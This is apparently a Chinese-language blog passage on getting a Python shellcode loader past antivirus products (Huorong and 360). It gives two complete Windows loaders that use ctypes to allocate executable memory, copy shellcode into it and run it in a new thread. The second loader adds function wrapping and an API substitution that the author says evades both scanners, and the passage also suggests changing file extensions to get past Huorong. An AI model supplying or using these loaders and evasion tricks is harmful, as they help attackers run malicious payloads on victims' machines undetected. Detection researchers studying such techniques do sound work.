



比如下面这个Python代码加载shellcode

```Python
import ctypes

def exec_shellcode(shellcode):
    shellcode = bytearray(shellcode)
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),buf,ctypes.c_int(len(shellcode)))
    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0),ctypes.c_uint64(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))
def main():
    buf =  b""
    shellcode = buf
    exec_shellcode(shellcode)
if __name__ == '__main__':
    main()
```

这些检查都是基于主动让他扫描检测的

# 绕过后缀名

用火绒的话一开始是可以检测出他是一个恶意脚本,后来不知道怎么就检测不出来了

不过修改文件后缀名是可以绕过火绒的



但是无论怎么修改后缀名都无法绕过360

![image-20230723231941978](img/image-20230723231941978.png)

# 函数封装+函数替换



```python

import ctypes

def  yy(a,b,c,d,e,f):#函数封装
    ret_value=ctypes.windll.kernel32.CreateThread(a,b,c,d,e,f)
    return ret_value

def exec_scode(scode):
    scode = bytearray(scode)
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(scode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
    buf = (ctypes.c_char * len(scode)).from_buffer(scode)
    ctypes.windll.kernel32.RtlCopyMemory(ctypes.c_uint64(ptr),buf,ctypes.c_int(len(scode)))#函数替换
    handle = yy(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_uint64(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))

def main():
    buf =  b""
    scode = buf
    exec_scode(scode)
if __name__ == '__main__':
    main()
```



竟然绕过了360+火绒

![image-20230723233538314](img/image-20230723233538314.png)